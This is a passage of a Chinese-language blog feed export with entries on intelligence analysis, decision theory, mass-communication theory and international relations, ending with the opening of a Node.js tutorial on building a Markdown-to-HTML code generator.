<p>丘吉尔早就看透了希特勒，因为丘吉尔对魔鬼的熟知程度非张伯伦所能及。张伯伦的现实主义是浅薄的。他知道人民需要和平，人民要把钱花在国内需求上而不是在武备上，所以他把那些东西给了人民。但是丘吉尔知道的更多。他是一个很少幻想的人，部分原因是他把时间——在他的学生时代之后——用于阅读历史和写作历史，而且他作为士兵和记者亲历了英国的殖民战争。因此，他知道人类是多么强悍和多么无理性。像所有明智的人一样，他朝着悲剧的方向思考：我们创造道德标准是为了衡量我们自己的缺陷。—— 罗伯特·D·卡普兰 | 《武士政治》p020</p>
</blockquote>
<h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><ul>
<li>以赛亚·伯林 | 《温斯顿·丘吉尔在1940年》（“Winston Churchill in 1940”）,1998</li>
<li>罗伯特·D·卡普兰 | 《武士政治》</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家：罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>竞争情报</title>
    <url>/2019/12/08/Intelligence-Competitive/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>“不知敌情，军不可动；知敌之情，非间不可”。—— 杜牧注《孙子兵法·用间篇》</p>
</blockquote>
<a id="more"></a>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h2 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h2><h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Manager</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>如何做出正确决策</title>
    <url>/2018/12/31/Intelligence-Decision/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>如何作出正确决策?</li>
<li>博弈、冲突、传播与大众行为</li>
</ul>
<a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><blockquote>
<p>要搞清楚一件非常非常不确定的事，或是我们一无所知的事情，就需要了解大量的信息。相反，如果我们对某件事已经有了较多的了解，那么不需要太多的信息就能把它搞清楚。所以，从这个角度来看，可以认为，信息量就等于不确定性的多少。——吴军《数学之美》</p>
</blockquote>
<h2 id="如何作出正确决策"><a href="#如何作出正确决策" class="headerlink" title="如何作出正确决策?"></a>如何作出正确决策?</h2><h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><ul>
<li>认知理论</li>
<li>冲突理论</li>
<li>大众传播理论</li>
</ul>
<h3 id="博弈论-Game-Theory"><a href="#博弈论-Game-Theory" class="headerlink" title="博弈论 Game Theory"></a>博弈论 Game Theory</h3><h3 id="冲突理论"><a href="#冲突理论" class="headerlink" title="冲突理论"></a>冲突理论</h3><ul>
<li>《冲突的战略》| 托马斯·谢林</li>
</ul>
<blockquote>
<p>1978年，李·比奇和特里·米切尔提出了决策的 “可能性模型 ” （ c o n t i n g e n c y m o d e l ） ，认为人类所采取的决策策略 ，会根据决策任务的背景变化而有所差异 。有时，人类会使用严谨的分析方法；有时，则会依赖于非分析方法。比奇和米切尔在解释 “严谨的分析方法 ”时，如行云流水般得心应手。但轮到 “非分析方法 ”时，他们则显得捉襟见肘，只能泛泛地解释为 “直观感觉”，或者说抛硬币，甚至提到了 “南无阿弥陀佛” 。——《如何作出正确决策》</p>
</blockquote>
<h3 id="组织决策理论"><a href="#组织决策理论" class="headerlink" title="组织决策理论"></a>组织决策理论</h3><ul>
<li>《经验的疆界》 | 詹姆斯·马奇(James G. March)</li>
</ul>
<p>詹姆斯·马奇(James G. March,1916～):组织决策研究领域最有贡献的学者之一，他在组织、决策和领导力等领域都颇有建树。</p>
<h3 id="大众传播理论"><a href="#大众传播理论" class="headerlink" title="大众传播理论"></a>大众传播理论</h3><h4 id="文化霸权"><a href="#文化霸权" class="headerlink" title="文化霸权"></a>文化霸权</h4><p>文化霸权（意大利语：Egemonia culturale，英语：Cultural hegemony）也称为文化领导权、领导权，是意大利马克思主义者安东尼奥·葛兰西所提出的哲学和社会学理论。它指的是：一个社会阶层可以通过操纵社会文化（信仰、解释、认知、价值观等），支配或统治整个多元文化社会；统治阶级的世界观会被强制作为唯一的社会规范，并被认为是有利于全社会的普遍有效的思想，但实际上只有统治阶级受益。阶级都要透过其知识分子在公民社会争取到知性与道德上的领导权。</p>
<ul>
<li>相关|高华|论国民党|意识形态理论家|理论创新</li>
</ul>
<h4 id="沉默的螺旋"><a href="#沉默的螺旋" class="headerlink" title="沉默的螺旋"></a>沉默的螺旋</h4><p>沉默的螺旋（spiral of silence）由伊丽莎白·诺尔-纽曼于1974年在发表于《传播学刊》(Journal of Communication)（《沉默的螺旋：一种大众观点理论》一文），并在1980年出版的《沉默的螺旋：舆论——我们的社会皮肤》一书中完善。</p>
<p>主要概念是：如果人们觉得自己的观点是公众中的少数派，他们将不愿意传播自己的看法；而如果他们觉得自己的看法与多数人一致，他们会勇敢的说出来。而且媒体通常会关注多数派的观点，轻视少数派的观点。于是少数派的声音越来越小，多数派的声音越来越大，形成一种螺旋式上升的模式。</p>
<p>沉没螺旋理论有三个假设前提。第一个假设是社会拥有一定的权力，会用孤立的方式威胁那些不和多数人保持一致的人。第二个假设是人们在不断地评估意见气候，个体会从两个来源获得关于民意的信息：个人观察和媒体。若多数人发生错误的观察则称为多数无知。第三个假设是公众的行为受到他们对民意评估的影响。公众要么大胆说出自己的观点，要么保持沉默。</p>
<ul>
<li>准统计官能（quasi-statistical organ）<br>学者Noelle-Neumann在历次的选举研究中发现，人类有观察环境中意见分配状况的能力，称为“准统计官能”。</li>
</ul>
<p>当人长久处在媒体讯息之下，久而久之自然会具备一种准统计官能，也就是感知外在氛围的能力，能够察觉媒体所呈现的主流意见，并且这些意见会转化为个人对于社会主要价值的认知。不过前提是，阅听人必须处在长时间的媒体渗透，也就是媒体讯息的暴露下，且个体间缺乏有效沟通，才会影响到态度层次，进而改变行为。</p>
<ul>
<li>多数的无知（pluralistic ignorance）</li>
</ul>
<p>人们“把带有自己倾向的感知与媒体过滤过的感知混合为一个结论无形的整体感觉，他们觉得这个判断来自自己的思考和经验”。人们通常会高估自己估计意见的能力，这种对多数人意见的错误观察，就称为“多数的无知”。在沉默的螺旋中，多数的无知指的是，即使个人对于某种意见持不赞成的态度，如果大众传播对这种意见持赞成态度的话，个人会错误的以为这种赞成态度是大多数人的意见。</p>
<ul>
<li>中坚分子（hard core）</li>
</ul>
<p>“在沉默的螺旋旋转过程中无视孤立的威胁的人”，被称为中坚分子。他们是一群愿意为自己的公开言论付出代价的人，这些特立独行的人通常与主流意见有所冲突。Noelle-Neumann表示，当某个意见被多数人赞成，以至于成为常识的时候，中坚分子成为最愿意公开发表意见的人，可能会导致沉默的螺旋的倒转。</p>
<p>另外，中文网络流行文化中的“硬核”一词，原本的含义为硬核说唱和硬核游戏的说法。硬核说唱是更具有力量感的音乐形式，热情奔放猛烈强劲，而硬核游戏存在一定难度并有特定受众的游戏，进而衍生为是表达很厉害、很酷、很彪悍、很刚硬的意思。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2018/12/31/Intelligence-Decision/" target="_blank" rel="noopener">如何作出正确决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家:罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/lpNVYqEIiZmINbQj1qZt_g" target="_blank" rel="noopener">俄军“新面貌”改革十年：问题与反思 | 梅夫利亚 《知远防务评论》</a></li>
<li>先由官员做决定，再由学者来论证这一决定是正确的”，“军师们”无法向上级提供决策建议与事实支撑，而只能作为总结和阐释政策的工具，这使“新面貌”的部分改革措施和规划仅能解决一时所需，缺乏长期建设性，因此在后期需要不断地“循环往复”。</li>
<li><a href="https://mp.weixin.qq.com/s/XUNWGOFrq6C8wGu4NabPDg" target="_blank" rel="noopener">最后的武士——超越净评估 | 知远战略与防务研究所  2018-03-30</a><br>如果不考虑系统分析和博弈论的局限性，不考虑决策在层层执行过程中的正向加强和负向衰减，往往就会出现“播下的是龙种，收获的是跳蚤”现象，结果事与愿违。</li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Manager</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>情报学 | Overview of Intelligence</title>
    <url>/2019/02/04/Intelligence/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>情报工作的最终目标是更好地理解和防御对手。</p>
</blockquote>
<a id="more"></a>
<blockquote>
<p>Many intelligence reports in war are contradictory;even more are false,and most are uncertain. — Carl von Clausewitz</p>
</blockquote>
<h2 id="Introduction-to-Intelligence"><a href="#Introduction-to-Intelligence" class="headerlink" title="Introduction to Intelligence"></a>Introduction to Intelligence</h2><p>情报的基本假设是：从各种来源获取外部信息，并根据现实要求进行分析，最终提供能影响决策的评估。这个过程会发生在个人层面或更高层，在机构层面、公司层面以及政府层面每一天都在上演。</p>
<h2 id="情报级别"><a href="#情报级别" class="headerlink" title="情报级别"></a>情报级别</h2><h4 id="战术情报"><a href="#战术情报" class="headerlink" title="战术情报"></a>战术情报</h4><h4 id="作业情报"><a href="#作业情报" class="headerlink" title="作业情报"></a>作业情报</h4><h4 id="战略情报"><a href="#战略情报" class="headerlink" title="战略情报"></a>战略情报</h4><blockquote>
<p>“战略并不是一个真正的计划，而是一个推动计划的逻辑。” —— John G. Heidenrich</p>
</blockquote>
<p>Strategic Intelligence. A renowned expert in strategic intelligence matters, John G. Heidenrich has long advocated an analytical approach that is “holistic” (comprehensive) by assessing the interactions of political, military/security, socio-cultural, economic, technological, and environmental variables.</p>
<p>约翰·海登里奇(John G. Heidenrich)是战略情报方面的著名专家, 他长期以来一直主张采取 “holistic” (comprehensive)  “整体” (全面) 的分析方法, 评估政治、军事安全、社会文化、经济、技术、和环境变量。</p>
<h2 id="情报来源"><a href="#情报来源" class="headerlink" title="情报来源"></a>情报来源</h2><h4 id="人工情报-HUMINT"><a href="#人工情报-HUMINT" class="headerlink" title="人工情报 HUMINT"></a>人工情报 HUMINT</h4><p>人工情报是情报收集最古老的形式。</p>
<h4 id="信号情报-SIGINT"><a href="#信号情报-SIGINT" class="headerlink" title="信号情报 SIGINT"></a>信号情报 SIGINT</h4><h4 id="公开情报-OSINT"><a href="#公开情报-OSINT" class="headerlink" title="公开情报 OSINT"></a>公开情报 OSINT</h4><h4 id="图像情报-IMINT"><a href="#图像情报-IMINT" class="headerlink" title="图像情报 IMINT"></a>图像情报 IMINT</h4><h4 id="测量与特征情报-MASINT"><a href="#测量与特征情报-MASINT" class="headerlink" title="测量与特征情报 MASINT"></a>测量与特征情报 MASINT</h4><h4 id="地理空间信息情报-GEOINT"><a href="#地理空间信息情报-GEOINT" class="headerlink" title="地理空间信息情报 GEOINT"></a>地理空间信息情报 GEOINT</h4><h4 id="其它概念"><a href="#其它概念" class="headerlink" title="其它概念"></a>其它概念</h4><ul>
<li>网络情报（CYBINT）主要来源于 ELINT 和 SIGINT</li>
<li>技术情报（TECHINT）</li>
<li>金融智能（FININT）</li>
</ul>
<h2 id="情报周期"><a href="#情报周期" class="headerlink" title="情报周期"></a>情报周期</h2><h4 id="方向（Direction）"><a href="#方向（Direction）" class="headerlink" title="方向（Direction）"></a>方向（Direction）</h4><h4 id="收集（Collection）"><a href="#收集（Collection）" class="headerlink" title="收集（Collection）"></a>收集（Collection）</h4><ul>
<li>地缘政治来源</li>
<li>经济来源</li>
<li>历史来源</li>
<li>业务来源</li>
</ul>
<h4 id="处理（Processing）"><a href="#处理（Processing）" class="headerlink" title="处理（Processing）"></a>处理（Processing）</h4><ul>
<li>正规化（Normalization）</li>
<li>索引（Indexing）</li>
<li>翻译（Translation）</li>
<li>拓线（Enrichment）: 为一条信息提供额外的元数据</li>
<li>过滤（Filtering）</li>
<li>优先级（Prioritization）</li>
<li>可视化（Visualization）</li>
</ul>
<h4 id="分析（Analysis）"><a href="#分析（Analysis）" class="headerlink" title="分析（Analysis）"></a>分析（Analysis）</h4><ul>
<li>置信级别</li>
</ul>
<p>谢尔曼·肯特（Sherman Kent）被很多人称为情报分析之父，他在1964年写了一篇名为“Words of Estimative Probability”的文章，其中描述了各种定性方式来描述分析师对置信级别的判断。</p>
<p>在所有的重要分析中，分析员(或者外部专家)必须就其对所表达判断的信心水平进行全面评估和明确表态。</p>
<blockquote>
<p>起初分析员的信心水平很低，但几个月后，他们的信息水平就很高了。决策者非常清楚分析员在这个问题上的观点发生了变化。—— 《不完美风暴》p117</p>
</blockquote>
<ul>
<li><strong>量化那些无法量化的内容</strong></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>概率</th>
<th>估计词汇</th>
<th>估计词汇</th>
<th>偏差区间</th>
</tr>
</thead>
<tbody>
<tr>
<td>100%</td>
<td>确定</td>
<td>Certainty</td>
<td></td>
</tr>
<tr>
<td>93%</td>
<td>几乎确定</td>
<td>Almost certain</td>
<td>上下浮动 6%</td>
</tr>
<tr>
<td>75%</td>
<td>可能</td>
<td>Probable</td>
<td>上下浮动 12%</td>
</tr>
<tr>
<td>50%</td>
<td>一半可能</td>
<td>Chances about even</td>
<td>上下浮动 10%</td>
</tr>
<tr>
<td>30%</td>
<td>大概不是</td>
<td>Probablly not</td>
<td>上下浮动 10%</td>
</tr>
<tr>
<td>7%</td>
<td>几乎不可能</td>
<td>Almost certainly not</td>
<td>上下浮动 5%</td>
</tr>
<tr>
<td>0%</td>
<td>不可能</td>
<td>Impossibility</td>
</tr>
</tbody>
</table>
</div>
<h4 id="传播（Dissemination）"><a href="#传播（Dissemination）" class="headerlink" title="传播（Dissemination）"></a>传播（Dissemination）</h4><h4 id="反馈（Feedback）"><a href="#反馈（Feedback）" class="headerlink" title="反馈（Feedback）"></a>反馈（Feedback）</h4><h2 id="情报机构"><a href="#情报机构" class="headerlink" title="情报机构"></a>情报机构</h2><h5 id="美国网络战司令部"><a href="#美国网络战司令部" class="headerlink" title="美国网络战司令部"></a>美国网络战司令部</h5><p>美国网络作战司令部（United States Cyber Command,USCYBERCOM）。前身：计算机网络防御联合特遣部队（JTF-CND）</p>
<h5 id="美国陆军行为与社会科学研究学院"><a href="#美国陆军行为与社会科学研究学院" class="headerlink" title="美国陆军行为与社会科学研究学院"></a>美国陆军行为与社会科学研究学院</h5><h5 id="信息共享和分析中心-ISACs"><a href="#信息共享和分析中心-ISACs" class="headerlink" title="信息共享和分析中心 ISACs"></a>信息共享和分析中心 ISACs</h5><p>信息共享和分析中心（Information Sharing and Analysis Center，ISACs）</p>
<h2 id="情报规范"><a href="#情报规范" class="headerlink" title="情报规范"></a>情报规范</h2><p>没有合适受众的情报不是好情报。</p>
<h4 id="美军《Joint-Publication-2-0》"><a href="#美军《Joint-Publication-2-0》" class="headerlink" title="美军《Joint Publication 2-0》"></a>美军《Joint Publication 2-0》</h4><ul>
<li><a href="https://www.jcs.mil/Portals/36/Documents/Doctrine/pubs/jp2_0.pdf" target="_blank" rel="noopener">《Joint Publication 2-0 : Joint Intelligence》</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%20Systems-Oriented%20Event%20Template.png" alt></p>
<h4 id="英军《Joint-Doctrine-Publication-2-00》"><a href="#英军《Joint-Doctrine-Publication-2-00》" class="headerlink" title="英军《Joint Doctrine Publication 2-00》"></a>英军《Joint Doctrine Publication 2-00》</h4><ul>
<li><a href="https://www.gov.uk/government/publications/jdp-2-00-understanding-and-intelligence-support-to-joint-operations" target="_blank" rel="noopener">Understanding and intelligence support to joint operations (JDP 2-00)</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%20The%20Interrelationship.png" alt></p>
<h2 id="Tool-amp-Technology"><a href="#Tool-amp-Technology" class="headerlink" title="Tool &amp; Technology"></a>Tool &amp; Technology</h2><h4 id="竞争性假设分析-ACH"><a href="#竞争性假设分析-ACH" class="headerlink" title="竞争性假设分析 ACH"></a>竞争性假设分析 ACH</h4><p>竞争性假设分析(Analysis of Competing Hypotheses,ACH)是 CIA 使用30年以上的研究方法论，ACH 帮助面对巨大量数据和假设条件时，进行有逻辑性的分析，指导研究人员识别争论的焦点，进行富有成效的讨论。</p>
<p>竞争性假设分析法强制分析人员考虑全部可能性，而不是凭直觉挑出来某一假设，再找证据支持这一假设。</p>
<h4 id="杀伤链-Kill-Chains"><a href="#杀伤链-Kill-Chains" class="headerlink" title="杀伤链 Kill Chains"></a>杀伤链 Kill Chains</h4><ul>
<li>Eric M. Hutchins（Lockheed Martin 公司）:”Intelligence-Driven Computer Net-work Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains”</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">digraph killchains&#123;</span><br><span class="line">   目标定位-&gt;侦查跟踪-&gt;武器构造-&gt;载荷投递-&gt;漏洞利用-&gt;后门安装-&gt;C2控制-&gt;达成目标;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h2><h4 id="Richard-Heuer"><a href="#Richard-Heuer" class="headerlink" title="Richard Heuer"></a>Richard Heuer</h4><p>Richard Heuer 在 CIA 工作45年，在竞争性假设分析领域成果卓著（Analysis of competing hypotheses），被称为 “情报之父”。</p>
<ul>
<li>《情报分析心理学》（The Psychology of Intelligence Analysis,2010）</li>
<li>《Structured Analytic Techniques for Intelligence Analysis》（ 2010年，与Randolph（Randy）H. Pherson 共同撰写）</li>
</ul>
<h4 id="谢尔曼·肯特（Sherman-Kent）"><a href="#谢尔曼·肯特（Sherman-Kent）" class="headerlink" title="谢尔曼·肯特（Sherman Kent）"></a>谢尔曼·肯特（Sherman Kent）</h4><p>谢尔曼·肯特（Sherman Kent）被很多人称为情报分析之父。</p>
<ul>
<li>耶鲁大学历史学博士</li>
<li>二战时期，加入美国政府战略服务办公室（OSS）的下属机构 —— 研究与分析部门（ R &amp; A ）。该部门包括经济学家、科学家和军事人员，职责不包括制定战术行动计划，而是重点分析对手的基础和运行环境，例如文化、食品、财政和运输，以帮助确定哪些行动将对国家战略产生最重大的影响。他们提供的战略情报不仅有助于完成一项任务，而且有助于整个战争。</li>
<li>1964年，“Words of Estimative Probability”</li>
</ul>
<h4 id="John-Heidenrich"><a href="#John-Heidenrich" class="headerlink" title="John Heidenrich"></a>John Heidenrich</h4><ul>
<li>Paper <a href="https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol51no2/the-state-of-strategic-intelligence.html" target="_blank" rel="noopener">The State of Strategic Analysis</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2018/12/31/Intelligence-Decision/" target="_blank" rel="noopener">如何作出正确决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家:罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="荐书"><a href="#荐书" class="headerlink" title="荐书"></a>荐书</h2><h5 id="《不完美风暴》"><a href="#《不完美风暴》" class="headerlink" title="《不完美风暴》"></a>《不完美风暴》</h5><ul>
<li>Title: 美国中央情报局反恐30年</li>
<li>Author: 迈克尔·莫雷尔（Michael Marell）</li>
<li>Author: 比尔·哈罗（Bill Harlow）</li>
</ul>
<h5 id="《情报分析心理学》"><a href="#《情报分析心理学》" class="headerlink" title="《情报分析心理学》"></a>《情报分析心理学》</h5><ul>
<li>Title: The Psychology of Intelligence Analysis</li>
<li>Author: Richard Heuer</li>
</ul>
<h5 id="《Incident-Response-amp-Computer-Forensics》-入侵调查"><a href="#《Incident-Response-amp-Computer-Forensics》-入侵调查" class="headerlink" title="《Incident Response &amp; Computer Forensics》(入侵调查)"></a>《Incident Response &amp; Computer Forensics》(入侵调查)</h5><ul>
<li>Author: McGraw-Hill</li>
<li>2014年 Third Edition</li>
</ul>
<h5 id="《情报驱动应急响应》"><a href="#《情报驱动应急响应》" class="headerlink" title="《情报驱动应急响应》"></a>《情报驱动应急响应》</h5><ul>
<li>Title:Intelligence-Driven Incident Response:Outwitting the Adversary</li>
<li>Author: Scott J. Roberts</li>
<li>Author: Rebekah Brown</li>
</ul>
<h5 id="《如何作出正确决策》"><a href="#《如何作出正确决策》" class="headerlink" title="《如何作出正确决策》"></a>《如何作出正确决策》</h5><ul>
<li>作者：加里·克莱因</li>
<li>如何作出正确决策:直击决策真相，揭秘是什么在影响你作决定</li>
<li>中国青年出版社</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Manager</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>国际关系专题 | Overview of International Relations</title>
    <url>/2018/02/01/International-Relations/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>对于政策制定者，力量投放位居第一，价值居第二。所以 “伤害别人的能力就是讨价还价的能力，开发这种能力就是外交”。—— 托马斯·谢林（Thomas C.Schelling）| 《武器与影响》(Arms and Influence)</p>
</blockquote>
<a id="more"></a>
<h2 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h2><h4 id="托马斯·谢林（Thomas-C-Schelling）"><a href="#托马斯·谢林（Thomas-C-Schelling）" class="headerlink" title="托马斯·谢林（Thomas C.Schelling）"></a>托马斯·谢林（Thomas C.Schelling）</h4><h4 id="罗伯特·D-卡普兰-Robert-D-Kaplan"><a href="#罗伯特·D-卡普兰-Robert-D-Kaplan" class="headerlink" title="罗伯特·D.卡普兰(Robert D.Kaplan)"></a>罗伯特·D.卡普兰(Robert D.Kaplan)</h4><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><ul>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：世界主要国家专利申请变化情况（欧洲专利局） <a href="https://riboseyim.github.io/charts/ip/index.html" target="_blank" rel="noopener">在线演示</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家：罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/zKeGZt5b4e4amFzd4kXavQ" target="_blank" rel="noopener">秦晖：21世纪的全球化危机</a></li>
<li><a href="https://mp.weixin.qq.com/s/CbVRCvh4seQTArsEHUd9Yg" target="_blank" rel="noopener">聂作平：天朝的铁幕是怎样被撬开的 | 聂作平  苍山夜谈 2018-04-13</a></li>
<li><a href="https://mp.weixin.qq.com/s/b6jXIpeos9_khcVCUS9jmQ" target="_blank" rel="noopener">中国人在美国学习国家安全战略是怎样的体验 | 周德宇  凤凰网国际智库  2018-06-27</a></li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:基于Node.js构建自定义代码生成器</title>
    <url>/2017/12/21/Language-Auto-Generator/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>在真实的软件开发过程中，无论使用何种编程开发语言，都不可避免的会遇到代码重复的问题。如何处理重复的问题，可以选择情怀（手动再敲一遍），也可以选择 Copy-to-Copy ，或者选择代码生成器。正如在之前的文章  <a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a> 中，我介绍过一种 Blog 生成器 hexo ，可以将 Markdown 格式的内容自动生成方便发布的 HTML 格式。本文将还原 hexo 的运行原理，为解决类似问题提供一些参考思路。</p>
<blockquote>
<p>示例：通过 Markdown 文件声明模板（源代码），通过脚本生成 HTML 文件（目标代码），并预览代码生成效果。</p>
</blockquote>
<span id="more"></span>
<h2 id="一、Hello-Node-js"><a href="#一、Hello-Node-js" class="headerlink" title="一、Hello Node.js"></a>一、Hello Node.js</h2><h4 id="Step-1-准备环境-dependencies"><a href="#Step-1-准备环境-dependencies" class="headerlink" title="Step 1: 准备环境 (dependencies)"></a>Step 1: 准备环境 (dependencies)</h4><p>开发语言 <a href="https://riboseyim.github.io/2017/05/16/Language-Node-lang/">Node.js</a>, 一个能够运行 JavaScript 的开放源代码、跨平台运行环境。</p>
<ul>
<li>npm init — 初始化 root 目录</li>
<li>npm i -s live-server — 该模块支持本示例生成静态 HTML 站点，提供热部署能力</li>
<li>npm i -s nodemon — 该模块支持当文件变化自动执行重构任务</li>
<li>npm i -s concurrently — 该模块支持支持并发执行任务、脚本(scripts/tasks)</li>
<li>npm i -s markdown-it — 该模块提供 Markdown 文件解析器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir project-generator</span><br><span class="line">mkdir project-generator/pages</span><br><span class="line">mkdir project-generator/pages_meta</span><br><span class="line">mkdir project-generator/js</span><br><span class="line">mkdir project-generator/css</span><br><span class="line">mkdir project-generator/images</span><br><span class="line">mkdir project-generator/build_scripts</span><br><span class="line">mkdir project-generator/build</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> project-generator</span><br><span class="line">npm init </span><br><span class="line">npm i -s concurrently</span><br><span class="line">npm i -s fs</span><br><span class="line">npm i -s fs-extra</span><br><span class="line">npm i -s markdown-it</span><br><span class="line">npm i -s live-server </span><br><span class="line">npm i -s nodemon</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language-Auto-Generator.png" alt=""></p>
<h4 id="Step-2-准备元数据"><a href="#Step-2-准备元数据" class="headerlink" title="Step 2: 准备元数据"></a>Step 2: 准备元数据</h4><p>例如：<strong>pages/index.md</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Home page</span><br><span class="line"></span><br><span class="line">Hello world!</span><br><span class="line"></span><br><span class="line">[Link to another page](./other.html)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>例如：<strong>pages_meta/index.json</strong> 用于存储一些需要的元数据（参数、固定内容等），JSON 文件格式方便后面调用。</p>
